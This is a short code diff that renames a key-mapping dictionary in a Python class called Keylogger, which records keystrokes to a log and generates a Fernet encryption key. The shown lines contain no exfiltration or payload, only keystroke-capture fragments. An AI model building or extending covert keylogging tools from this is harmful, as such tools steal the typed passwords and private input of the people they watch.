@@ -13,7 +13,7 @@ SECRET = Fernet.generate_key()
 
 
 class Keylogger:
-    ks = {
+    special_keys = {
         Key.space: " ",
         Key.enter: "[ENTER]\n",
         Key.esc: "[ESC]",
@@ -41,7 +41,7 @@ class Keylogger:
         try:
             name = key.char
         except AttributeError:
-            name = Keylogger.ks.get(key, str(key))
+            name = Keylogger.special_keys.get(key, str(key))
 
         self.update_log(name.replace("'", ""))
 
